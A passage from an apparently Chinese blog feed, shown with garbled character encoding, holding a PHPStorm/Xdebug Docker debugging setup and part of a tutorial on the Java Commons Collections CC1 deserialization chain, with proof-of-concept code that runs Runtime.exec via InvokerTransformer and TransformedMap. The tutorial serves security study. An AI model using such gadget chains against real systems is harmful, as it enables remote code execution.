2ä¸å¤ªä¸€æ ·</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.client_host = host.docker.internal&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.client_port = 9003&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.mode = debug&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.max_nesting_level = 1000&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.discover_client_host = true&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="comment">#é‡å¯ nginx ssh</span></span><br><span class="line">service nginx restart</span><br><span class="line">service ssh restart</span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment">#åŸä½œè€…åœ¨è¿™åŠ äº†ä¸€ä¸ªsleep infinityå¹¶å®å˜±ä¸€å®šåŠ ä¸Š...... æˆ‘ä»¬è¿™é‡Œåƒä¸‡ä¸è¦åŠ , ä¸ç„¶è¿›ç¨‹ä¼šä¸€ç›´å¡åœ¨è¿™å¯¼è‡´ä½ è®¿é—®ä¸äº†webé¡µé¢</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment">######################################</span></span><br></pre></td></tr></table></figure><p>åƒä¸‡è¦æ³¨æ„è¿™é‡Œé¢˜ç›®ä¸­ä½¿ç”¨çš„æ˜¯nginx, ä¸æ˜¯apache2</p><p>ä¹‹åç»§ç»­å¯¹dockerfileåšå‡ºè°ƒæ•´, æœ€ç»ˆä¸º</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctfhub/web_nginx_mysql_php_8.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sh -c <span class="string">&#x27;mysqld_safe &amp;&#x27;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">sleep</span> 5s \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; mysql -e <span class="string">&quot;source /var/www/html/db.sql;&quot;</span> -uroot -proot </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pecl install http://pecl.php.net/get/xdebug-3.1.5.tgz \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; docker-php-ext-enable xdebug \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install ssh -y</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/config</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/static</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /start.sh</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/start.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å¥½start.shå’Œdockerfileä¹‹å, æˆ‘ä»¬æ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªé•œåƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t mycodbox .</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240327234247184.png" alt="image-20240327234247184"></p><p>ä¹‹åæ–°å»ºä¸€ä¸ªå®¹å™¨æŠŠ81å’Œ22ç«¯å£æ˜ å°„å‡ºæ¥</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328000916452.png" alt="image-20240328000916452"></p><p>çœ‹åˆ°è¿™é‡Œå°±ç®—æˆåŠŸäº†</p><p>è®¿é—®ä¸€ä¸‹ä¹Ÿæ²¡ä»€ä¹ˆé—®é¢˜</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001145301.png" alt="image-20240328001145301"></p><p>ä¹‹åé…ç½®phpstorm, è¿™é‡ŒåŸæ–‡ä¸­å°±æ²¡ä»€ä¹ˆå‘äº†</p><p>ç›´æ¥è·³è½¬åˆ°åŸæ–‡é“¾æ¥çš„æ–¹æ³•äºŒ, </p><p><a href="https://www.freebuf.com/articles/web/266512.html">https://www.freebuf.com/articles/web/266512.html</a></p><p>åé¢è‡³ä½œç®€å•çš„ç¤ºä¾‹</p><p>é€‰æ‹©è¿™ä¸ª</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001340954.png" alt="image-20240328001340954"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001418960.png" alt="image-20240328001418960"></p><p>ä¸€è·¯next</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001550926.png" alt="image-20240328001550926"></p><p>ä¸€è·¯nextç›´åˆ°çœ‹è§é¡¹ç›®</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001907238.png" alt="image-20240328001907238"></p><p>ä¹‹åè¦åš</p><ol><li>é…ç½® CLI Interpreter</li><li>é…ç½®ç›®å½•æ˜ å°„</li><li>è®¾ç½®Xdebugç«¯å£</li><li>é…ç½®ä¸€ä¸ª Run&#x2F;Debug Configuration</li><li>å¯åŠ¨ PHP Debug Listening</li></ol><p><strong>é…ç½® CLI Interpreter</strong></p><p>è¿›å…¥ File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHPã€‚è®¾ç½® CLI Interpreter</p><p>æ–°å»ºä¸€ä¸ª CLI Interpreterã€‚é€‰æ‹© From Docker, Vagrant, VM, WSL,Remoteâ€¦.</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥å¡« SSHï¼Œä¹Ÿå¯ä»¥ç›´æ¥é€‰æ‹© Dockerã€‚æˆ‘è¿™é‡Œç”¨çš„æ˜¯ SSH</p><p>è®¾ç½® PHP executable è·¯å¾„ã€‚ä¸çŸ¥é“å¯ä»¥è¿›å…¥ container ä¸­ä½¿ç”¨<code>whereis php</code>è¿›è¡Œæœç´¢</p><p>å‚è€ƒåŸæ–‡, è¿™é‡Œä¸åšæ¼”ç¤ºäº†</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002119294.png" alt="image-20240328002119294"></p><p><strong>é…ç½® ç›®å½•æ˜ å°„</strong></p><p>è¿›å…¥ File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP -&gt; Serversã€‚é…ç½®ç›®å½•æ˜ å°„</p><p>æ³¨æ„ä¸€å®šè¦æŠŠ Use path mappings çš„å‹¾å‹¾ä¸Šï¼Œæ‰èƒ½é…ç½®ç›®å½•æ˜ å°„</p><p>Absolute path on the server æ˜¯è¦æ‰‹åŠ¨æ‰“ä¸ŠæœåŠ¡å™¨è·¯å¾„çš„</p><p><strong>é…ç½®ä¸€ä¸ª Run&#x2F;Debug Configuration</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002530718.png" alt="image-20240328002530718"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002948142.png" alt="image-20240328002948142"></p><p>æ‰“ä¸ªæ–­ç‚¹è¯•è¯•, æˆåŠŸ!!</p><p><strong><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002929316.png" alt="image-20240328002929316"></strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP-storm-Xdebug-è¿œç¨‹è°ƒè¯•dockeré¡¹ç›®-sshéš§é“&quot;&gt;&lt;a href=&quot;#PHP-storm-Xdebug-è¿œç¨‹è°ƒè¯•dockeré¡¹ç›®-sshéš§é“&quot; class=&quot;headerlink&quot; title=&quot;PHP storm + Xdebug è¿œç¨‹è°ƒ</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Javaååºåˆ—åŒ–ä¹‹CCé“¾</title>
    <link href="http://example.com/2024/03/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE/"/>
    <id>http://example.com/2024/03/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE/</id>
    <published>2024-03-15T13:17:27.000Z</published>
    <updated>2024-05-21T14:45:18.455Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.freebuf.com/articles/web/335892.html">https://www.freebuf.com/articles/web/335892.html</a></p><p><a href="https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/#1X2-%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6CC%E9%93%BE%EF%BC%881-7%EF%BC%89">https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/#1X2-%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6CC%E9%93%BE%EF%BC%881-7%EF%BC%89</a></p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>jdk-8u65</p><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><p>jdkæºç </p><p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p><p>maven3.6.3</p><p><a href="https://archive.apache.org/dist/maven/maven-3/3.6.3/binaries/">https://archive.apache.org/dist/maven/maven-3/3.6.3/binaries/</a></p><p>å…³äºmavençš„é…ç½®æ•™ç¨‹</p><p><a href="https://blog.csdn.net/succing/article/details/127281200">https://blog.csdn.net/succing/article/details/127281200</a></p><p>å‘æ¯”è¾ƒå¤š, ä¸è¿‡ä¸Šé¢è¿™å‡ ç¯‡æ–‡ç« éƒ½èƒ½å®Œç¾è§£å†³</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240315213238197.png" alt="image-20240315213238197"></p><p>åˆ°è¿™é‡Œç¯å¢ƒå°±æ­å»ºå¥½äº†</p><p>ç°åœ¨å¼€å§‹åˆ†æé“¾å­</p><h2 id="é“¾å­åˆ†æ"><a href="#é“¾å­åˆ†æ" class="headerlink" title="é“¾å­åˆ†æ"></a>é“¾å­åˆ†æ</h2><p>è¿˜è®°å¾—Javaååºåˆ—åŒ–çš„åŸºç¡€å—, æˆ‘ä»¬éœ€è¦ä¸€ä¸ªreadObjectæ–¹æ³•æ¥ä½œä¸ºååºåˆ—åŒ–çš„å…¥å£</p><p>è€Œæˆ‘ä»¬çš„æœ€ç»ˆç›®çš„å½“ç„¶æ˜¯å‘½ä»¤æ‰§è¡Œ</p><p>ä¸€ä¸ªæ­£å¸¸çš„æ€è·¯åº”è¯¥æ˜¯ä»é“¾å­çš„å°¾éƒ¨å¼€å§‹çš„, å…ˆæ‰¾åˆ°å±é™©å‡½æ•°, å†æƒ³åŠæ³•å¦‚ä½•è°ƒç”¨åˆ°å®ƒ</p><p>æ‰€ä»¥é¦–å…ˆæ˜¯å¯»æ‰¾ä¸€ä¸ªå¯ä»¥å‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹</p><p>è¿™é‡Œéœ€è¦çš„æ˜¯Transformerè¿™ä¸ªæ¥å£</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317132926538.png" alt="image-20240317132926538"></p><p>ctrl + alt + BæŸ¥çœ‹å®ç°äº†è¯¥æ¥å£çš„ç±»</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317133044679.png" alt="image-20240317133044679"></p><p>è¿™é‡Œè¦ç”¨åˆ°çš„å°±æ˜¯InvokerTransformerè¿™ä¸ªç±»</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317133325160.png" alt="image-20240317133325160"></p><p>InvokerTransformerçš„transformæ–¹æ³•å­˜åœ¨åå°„è°ƒç”¨ä»»æ„ç±»</p><p>æµ…è¯•ä¸€ä¸‹åˆ©ç”¨InvokerTransformerç±»æ¥å¼¹ä¸ªè®¡ç®—å™¨</p><p>æ ¹æ®è¿™ä¸ªæ„é€ å‡½æ•°æ¥ä¼ å…¥å‚æ•°</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317141434267.png" alt="image-20240317141434267"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span>  <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317141358312.png" alt="image-20240317141358312"></p><p>è¿™é‡Œå°±æˆåŠŸå¼¹äº†è®¡ç®—å™¨</p><p>ç°åœ¨æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªæœ€ç»ˆçš„å‡ºå£, æ¥ä¸‹æ¥å°±æ˜¯è¦è¿”å›å»æ‰¾å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªå±é™©çš„transformæ–¹æ³•</p><p>å³é”®find useges, æ‰¾åˆ°è¿™ä¸ªTransformedMap</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317142752780.png" alt="image-20240317142752780"></p><p>è·Ÿè¿›</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317143423354.png" alt="image-20240317143423354"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317143534346.png" alt="image-20240317143534346"></p><p>ç¬¬203è¡Œçš„checkSetValueè°ƒç”¨äº†valueTransformerä¸‹çš„transform, è€Œè¿™ä¸ªvalueTransformeræ˜¯ç”±æ„é€ å‡½æ•°çš„å‚æ•°å†³å®šçš„</p><p>å¹¶ä¸”, æ„é€ å™¨TransformedMapæ˜¯ä¸€ä¸ªprotectedä¿æŠ¤ç±»å‹, æˆ‘ä»¬ä¸èƒ½ä»å¤–éƒ¨ç›´æ¥è°ƒç”¨, éœ€è¦ä»å…¶ä»–è°ƒç”¨äº†TransformedMapçš„åœ°æ–¹å…¥æ‰‹ </p><p>åœ¨<code>decorate()</code>é™æ€æ–¹æ³•ä¸­, ç›´æ¥newäº†ä¸€ä¸ªTransformedMapå¯¹è±¡</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317144110965.png" alt="image-20240317144110965"></p><p>æ§åˆ¶valueTransformerçš„åœ°æ–¹æœ‰äº†, é‚£ä¹ˆè°æ¥è°ƒç”¨checkSetValueå‘¢?</p><p>ä¾æ—§æ˜¯find useages</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317145629199.png" alt="image-20240317145629199"></p><p>åœ¨AbstractInputCheckedMapDecoratorè¿™ä¸ªæŠ½è±¡ç±»ä¸­çš„**setValue()**è°ƒç”¨äº†checkSetValueæ–¹æ³•</p><p>å¹¶ä¸”AbstractInputCheckedMapDecoratoræ˜¯TransformedMapçš„çˆ¶ç±»</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317175103045.png" alt="image-20240317175103045"></p><p>è¿™é‡Œå°±ä¸å¾—ä¸è¡¥ä¸€ä¸‹javaé›†åˆçš„çŸ¥è¯†, </p><p>åœ¨éå†ä¸€ä¸ªé›†åˆæ—¶, å¯ä»¥ä½¿ç”¨å¢å¼ºforå¾ªç¯è¿›è¡Œä¸€ä¸‹æ“ä½œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;Integer, String&gt; entry : map.entrySet()) &#123;</span><br><span class="line">    <span class="comment">//Map.entry&lt;Integer,String&gt; æ˜ å°„é¡¹ï¼ˆé”®-å€¼å¯¹ï¼‰  æœ‰å‡ ä¸ªæ–¹æ³•ï¼šç”¨ä¸Šé¢çš„åå­—entry</span></span><br><span class="line">    <span class="comment">//entry.getKey() ;entry.getValue(); entry.setValue();</span></span><br><span class="line">    <span class="comment">//map.entrySet()  è¿”å›æ­¤æ˜ å°„ä¸­åŒ…å«çš„æ˜ å°„å…³ç³»çš„ Setè§†å›¾ã€‚</span></span><br><span class="line">    System.out.println(<span class="string">&quot;key= &quot;</span> + entry.getKey() + <span class="string">&quot; and value= &quot;</span> + entry.getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­Map.Entry&lt;Integer, String&gt; entryè¡¨ç¤ºé”®å€¼å¯¹, map.entrySet()è¡¨ç¤ºé”®å€¼å¯¹çš„é›†åˆ</p><p>è¿™é‡ŒsetValue()å°±æ˜¯entryä¸‹çš„ä¸€ä¸ªæ–¹æ³•</p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨TransformedMapé‡Œçš„decorateåˆ›å»ºä¸€ä¸ªTransformedMapå®ä¾‹, ç”±äºå…¶ç»§æ‰¿äº†AbstractInputCheckedMapDecoratorç±», å½“è°ƒç”¨setValueæ—¶, å°±å¯¹è°ƒç”¨AbstractInputCheckedMapDecoratorä¸‹çš„setValue, ä»è€Œè°ƒç”¨parent.checkSetValue(value);</p><p>é‚£ä¹ˆ, è¿™ä¸ªparentåˆæ˜¯æ€ä¹ˆä¸€å›äº‹å‘¢?</p><p>å¥½åƒå¾ˆå°‘æœ‰æ–‡ç« æŠŠè¿™ä¸ªè®²çš„å¾ˆæ˜ç™½(æˆ–è®¸æ˜¯æˆ‘å¤ªèœäº†)</p><p>æˆ‘ä»¬é¢„æœŸçš„parentåº”è¯¥æ˜¯ä¸€ä¸ªInvokerTransformerçš„å¯¹è±¡</p><p>ä¸å¦¨è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹æ€ä¹ˆä¸ªäº‹</p><p>æ³¨æ„çœ‹è¿™ä¸ªtransformedmap.entrySet()</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318220856808.png" alt="image-20240318220856808"></p><p>è·Ÿè¿›</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318221154799.png" alt="image-20240318221154799"></p><p>è¿™é‡Œè·³åˆ°äº†TransformedMapçš„çˆ¶ç±»AbstractInputCheckedMapDecoratorä¸‹çš„entrySet(), æ³¨æ„æ­¤æ—¶ä»ç„¶åœ¨TransformedMapä¸­, è¿™ä¸ªentrySet()æ˜¯ç»§æ‰¿æ¥çš„</p><p>è·Ÿè¿›isSetValueChecking()</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318221426861.png" alt="image-20240318221426861"></p><p>è¿™é‡Œå›åˆ°äº†TransformedMapè‡ªå·±çš„isSetValueChecking()æ–¹æ³•, ç”±äºvalueTransformerèµ‹å€¼äº†, æ‰€ä»¥è¿”å›true</p><p>è·Ÿè¿›</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318221554102.png" alt="image-20240318221554102"></p><p>æ³¨æ„è¿™ä¸ªEntrySet(), ç¬¬äºŒä¸ªå‚æ•°æ˜¯this, ä¹Ÿå°±æ˜¯æœ¬èº«, è·Ÿè¿›</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318221800461.png" alt="image-20240318221800461"></p><p>è¿™é‡Œæç„¶å¤§æ‚Ÿ, this.parentå°±æ˜¯è¿™ä¸ªå¯¹è±¡æœ¬èº«, æ­¤æ—¶è¿™ä¸ªå¯¹è±¡å°±æ˜¯TransformedMapå®ä¾‹, å®ƒä¸‹é¢çš„checkSetValueæ­£æ˜¯æˆ‘ä»¬è¦è°ƒç”¨åˆ°çš„æ–¹æ³•</p><p>è‡³æ­¤è¿™ä¸ªè°œå›¢å°±è¢«è§£å¼€äº†</p><p>é‚£ä¹ˆæˆ‘ä»¬ä»decorateå¼€å§‹, ç¼–å†™ä¸€æ®µpoc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span>  <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        Map&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;n4c1&quot;</span>, <span class="string">&quot;cabbage&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry : transformedmap.entrySet()) &#123;</span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317184029496.png" alt="image-20240317184029496"></p><p>æˆåŠŸè°ƒç”¨</p><p>è‡³æ­¤, é“¾å­å°±å»¶ä¼¸åˆ°äº†setValue</p><p>ä¾æ—§æ˜¯find usages, çœ‹çœ‹å“ªé‡Œè°ƒç”¨äº†setValue</p><p>è¿™é‡Œåº”è¯¥æ˜¯è¦æœç´¢æ‰¾ä¸€ä¸ªAnnotationInvocationHandlerç±», ä½†æ˜¯æˆ‘å¹¶æ²¡æœ‰æ‰¾åˆ°</p><p>æ‰€ä»¥ç›´æ¥å»åˆ°ç›®å½•ä¸‹æ‰¾äº†</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317205707923.png" alt="image-20240317205707923"></p><p>è¿™é‡Œæ˜¯ç‚¹è¿›å»æ˜¯.classæ–‡ä»¶, çœ‹è§çš„å°±æ˜¯åç¼–è¯‘åçš„ä»£ç , é‚£ä¹ˆå°±å¯ä»¥è‚¯å®šæ˜¯é…ç½®æºç é‚£ä¸€æ­¥å‡ºé”™äº†</p><p>æ‰¾äº†åŠå¤©å‘ç°ä¹‹å‰sunåŒ…çš„æ›¿æ¢æé”™äº†, æ­£ç¡®çš„è·¯å¾„: jdk-af660750b2f4\src\share\classes\sun</p><p>åº”è¯¥ä½¿ç”¨è¿™é‡Œçš„sunåŒ…åŠ åˆ°djkçš„srcä¸­å»</p><p>ä¹‹åå°±å¯ä»¥æ‰¾åˆ°AnnotationInvocationHandlerè¿™ä¸ªç±», å®ƒé‡å†™äº†åº”è¯¥readObjectæ–¹æ³•ä¸”åœ¨readObjectä¸­è¿›è¡Œäº†å¯¹é›†åˆçš„éå† å¹¶ä¸”è°ƒç”¨äº†setValue</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318223012579.png" alt="image-20240318223012579"></p><p>æˆ‘ä»¬çš„ç¬¬ä¸€æƒ³æ³•åº”è¯¥æ˜¯å»æ§åˆ¶è¿™ä¸ªmemberValues()</p><p>å¯ä»¥çœ‹è§åœ¨æ„é€ å‡½æ•°ä¸­å¯¹å…¶è¿›è¡Œäº†èµ‹å€¼, ä½†æ˜¯è¿™ä¸ªæ„é€ å‡½æ•°å¹¶æ²¡æœ‰publicä¿®é¥°</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318223208459.png" alt="image-20240318223208459"></p><p>å› æ­¤éœ€è¦ç”¨åå°„è·å–è¿™ä¸ªç±»</p><p>è¿™é‡Œæ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°Class&lt;? extends Annotation&gt;è¡¨ç¤ºä¸€ä¸ªæ³¨è§£ç±»</p><p><strong>ä»€ä¹ˆæ˜¯æ³¨è§£ç±»?</strong></p><p><a href="https://www.runoob.com/w3cnote/java-annotation.html">https://www.runoob.com/w3cnote/java-annotation.html</a></p><p>æŒ‰æˆ‘ä¸ªäººç†è§£, è¿™ä¸pythonçš„è£…é¥°å™¨æœ‰ä¸€ä¸çš„ç›¸ä¼¼ä¹‹å¤„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aihConstructor.newInstance(Target.class, transformedmap);<span class="comment">//ä¼ å…¥ä¸€ä¸ªTargetç±», ä»–å°±æ˜¯ä¸€ä¸ªæ³¨è§£ç±»</span></span><br></pre></td></tr></table></figure><p>ç”±æ­¤å°±å¯ä»¥è°ƒç”¨åˆ°memberValue.setValueå³transformedmap.setValue</p><p>ä½†æ˜¯çœ¼å‰åˆå‡ºç°äº†ä¸€ä¸ªé—®é¢˜, å°±æ˜¯å¦‚ä½•æ»¡è¶³è¿™é‡Œçš„ifæ¡ä»¶</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240320220648856.png" 